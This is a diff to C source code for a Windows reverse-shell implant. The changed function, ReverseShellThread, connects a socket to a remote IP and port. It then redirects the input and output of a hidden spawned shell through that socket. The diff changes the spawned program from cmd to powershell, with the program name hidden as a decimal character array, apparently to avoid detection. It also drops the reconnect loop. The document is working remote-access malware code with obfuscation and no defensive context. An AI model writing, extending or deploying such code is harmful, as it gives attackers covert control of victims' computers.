@@ -111,9 +111,7 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     shell_addr.sin_port = htons(port);
     shell_addr.sin_family = AF_INET;
     shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
-    
-    //Always Listening
-    while(1){
+
     //Create TCP Socket for each new connection
     shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); 
     //Connecting to Target Server
@@ -139,13 +137,13 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     sinfo.wShowWindow = SW_HIDE;
     //Pipe Standard Input, Output and Error to Socket
     sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) shell;
-    //cmd in dec
-    int decimal_array[] = {99, 109, 100};
+    //powershell in dec
+    int decimal_array[] = {112, 111, 119, 101, 114, 115, 104, 101, 108, 108};
     //Calculate array size
     int array_size = sizeof(decimal_array) / sizeof(decimal_array[0]);
     //Convert dec array to str
     char* str = conv(decimal_array, array_size);
-    //Using CreateProcess API to spawn cmd
+    //Using CreateProcess API to spawn powershell
     //NULL, Process to Spawn, NULL, NULL, BOOLEAN, Creation Flags, NULL, NULL, Address of Startup Information Structure, Address of Process Information Structure
     CreateProcess(NULL, str, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
     //Startup Process
@@ -153,7 +151,6 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     CloseHandle(pinfo.hThread);
     //Set Value of Receiving Server Buffer to 0
     ZeroMemory(RecData, sizeof(RecData));
-    }
 }
 
 char* conv(int decimal_array[], int array_size) {
@@ -168,4 +165,3 @@ char* conv(int decimal_array[], int array_size) {
 
     return str;
 }
-
